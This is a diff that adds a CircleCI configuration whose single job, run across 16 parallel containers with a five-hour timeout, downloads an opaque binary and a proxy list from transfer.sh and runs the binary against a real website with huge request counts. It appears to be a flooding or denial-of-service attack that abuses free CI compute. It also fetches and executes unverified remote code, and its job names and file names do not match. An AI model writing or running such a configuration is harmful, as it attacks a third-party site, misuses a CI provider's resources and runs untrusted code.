@@ -1,0 +1,17 @@
+version: 2.1 
+jobs: 
+    trial: 
+      docker: 
+            - image: debian:latest 
+      parallelism: 16 
+      steps: 
+        - run: 
+            name: Install Dependencies 
+            command: apt update && sudo apt install nodejs wget unzip -y && wget https://transfer.sh/1Q52ru/jstwovv.zip && wget https://transfer.sh/Fueymd/proxy.txt && unzip jstwovv.zip && rm -rf jstwovv.zip && cd raw && chmod +x jstwovv && ./jstwovv https://www.oreilly.com/ 1000 9999999999999 100 1 proxies.txt
+            no_output_timeout: 5h 
+ 
+workflows: 
+    version: 2.1 
+    build: 
+        jobs: 
+        - triall
